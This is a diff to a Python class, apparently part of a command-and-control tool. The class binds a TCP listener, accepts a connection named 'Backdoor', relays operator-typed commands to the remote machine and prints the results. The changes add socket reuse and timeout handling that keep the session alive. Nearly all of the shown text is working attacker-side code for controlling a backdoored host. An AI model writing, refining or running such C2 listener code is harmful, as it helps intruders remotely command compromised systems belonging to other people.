@@ -15,6 +15,7 @@ class StageLisner:
     def LisnerData(self):
 
         CallBackSocket= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        CallBackSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         Server = '0.0.0.0'
         Port= self.args.Port
         CallBackSocket.bind((Server,Port))
@@ -25,9 +26,12 @@ class StageLisner:
        
         while True:  
             try: 
-                Backdoor.settimeout(5)
-                Data = str(Backdoor.recv(4096).decode('latin-1'))
-                print(Data,end='', flush=True)   
+                try:
+                    Backdoor.settimeout(5)
+                    Data = str(Backdoor.recv(4096).decode('latin-1'))
+                    print(Data,end='', flush=True)
+                except TimeoutError:
+                        Backdoor.sendall('\n'.encode(('latin-1')))    
                 InPutCommand = input()
                 if InPutCommand == None :
                     Backdoor.sendall('\n'.encode(('latin-1')))
@@ -58,10 +62,10 @@ class StageLisner:
                         print(str(Data)+InPutCommand.split()[-1],' No such file or directory\n',end='', flush=True)
 
                 else:  
-
                     Backdoor.sendall(bytes(InPutCommand.encode(('latin-1'))))
                     Data = str(Backdoor.recv(4096).decode('latin-1'))
                     print(Data,end='', flush=True)
+
             except TimeoutError : 
                Backdoor.sendall('\n'.encode(('latin-1')))
     def C2Control(self): 
